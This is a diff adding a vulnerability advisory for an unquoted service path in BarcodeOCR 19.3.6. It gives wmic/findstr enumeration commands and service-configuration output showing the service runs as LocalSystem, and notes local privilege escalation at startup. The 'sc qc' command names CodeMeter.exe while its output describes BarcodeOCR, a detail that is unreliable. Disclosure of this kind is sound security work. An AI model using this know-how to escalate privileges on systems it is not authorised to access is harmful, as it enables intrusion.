@@ -1,0 +1,34 @@
+# Exploit Title: BarcodeOCR 19.3.6 - 'BarcodeOCR' Unquoted Service Path
+# Discovery Date: 2020-07-31
+# Response from BarcodeOCR Support: 08/03/2020
+# Exploit Author: Daniel Bertoni
+# Vendor Homepage: https://www.barcode-ocr.com/
+# Version: 19.3.6
+# Tested on: Windows Server 2016, Windows 10
+
+# Find the Unquoted Service Path Vulnerability:
+
+C:\wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+BarcodeOCR	Auto	BarcodeOCR	C:\Program Files (x86)\BarcodeOCR\Service.exe
+
+# Service info:
+
+C:\sc qc CodeMeter.exe
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: BarcodeOCR
+        TIPO               	  : 10  WIN32_OWN_PROCESS
+        TIPO_AVVIO         	  : 2   AUTO_START
+        CONTROLLO_ERRORE   	  : 1   NORMAL
+        NOME_PERCORSO_BINARIO     : C:\Program Files (x86)\BarcodeOCR\Service.exe
+        GRUPPO_ORDINE_CARICAMENTO :
+        TAG                	  : 0
+        NOME_VISUALIZZATO         : BarcodeOCR
+        DIPENDENZE       	  :
+        SERVICE_START_NAME : LocalSystem
+
+
+# Exploit:
+
+A successful attempt to exploit this vulnerability could allow to execute code during startup or reboot with the elevated privileges.
